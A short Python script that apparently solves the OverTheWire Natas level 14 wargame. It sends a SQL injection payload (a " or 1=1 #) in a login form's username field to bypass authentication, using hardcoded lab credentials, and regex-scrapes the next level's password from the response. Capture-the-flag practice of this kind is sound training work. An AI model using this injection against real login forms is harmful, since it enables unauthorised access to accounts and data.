import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas14', 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1')
def get_pass():
    dat = {'username':'a " or 1=1 #','password':'','submit':'Login'}
    r = requests.post('http://natas14.natas.labs.overthewire.org/', auth=auth,data=dat)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])

if __name__ == "__main__":
    get_pass()
